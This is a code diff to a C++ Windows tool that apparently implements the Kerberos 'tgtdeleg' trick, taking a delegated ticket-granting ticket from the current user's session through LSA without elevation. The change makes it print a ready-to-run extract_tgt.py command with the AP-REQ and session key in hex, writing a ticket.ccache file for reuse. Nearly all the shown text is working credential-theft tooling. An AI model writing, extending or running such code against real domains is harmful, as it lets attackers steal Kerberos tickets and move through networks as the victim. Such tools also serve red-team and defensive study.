@@ -260,11 +260,11 @@ BOOL InitAPIs() {
 }
 
 // --- Helper Functions ---
-void PrintHex(const unsigned char* data, size_t len) {
+void PrintHex(const unsigned char* data, size_t len, bool newline = true) {
     for (size_t i = 0; i < len; ++i) {
         printf("%02X", data[i]);
     }
-    printf("\n");
+    if (newline) printf("\n");
 }
 
 std::string GetTargetSPN(const char* userTarget) {
@@ -379,10 +379,9 @@ int RunTgtDeleg(const std::string& target) {
         return 1;
     }
     
-    // === Step 3: Output AP-REQ ===
-    printf("[AP-REQ]\n");
-    PrintHex((unsigned char*)sbOut.pvBuffer, sbOut.cbBuffer);
-    printf("\n");
+    // === Step 3: Output extract_tgt command ===
+    printf("python3 other_tools/extract_tgt.py -req ");
+    PrintHex((unsigned char*)sbOut.pvBuffer, sbOut.cbBuffer, false);
     
     // === Step 4: Connect to LSA (untrusted = no elevation needed) ===
     HANDLE hLsa;
@@ -438,9 +437,9 @@ int RunTgtDeleg(const std::string& target) {
         PKERB_RETRIEVE_TKT_RESPONSE pResp = (PKERB_RETRIEVE_TKT_RESPONSE)pResponse;
         
         if (pResp && pResp->Ticket.SessionKey.Value) {
-            printf("[Session Key]\n");
-            PrintHex(pResp->Ticket.SessionKey.Value, pResp->Ticket.SessionKey.Length);
-            printf("\n");
+            printf(" -key ");
+            PrintHex(pResp->Ticket.SessionKey.Value, pResp->Ticket.SessionKey.Length, false);
+            printf(" -out ticket.ccache\n");
         } else {
             fprintf(stderr, "[-] No Session Key in response.\n");
         }
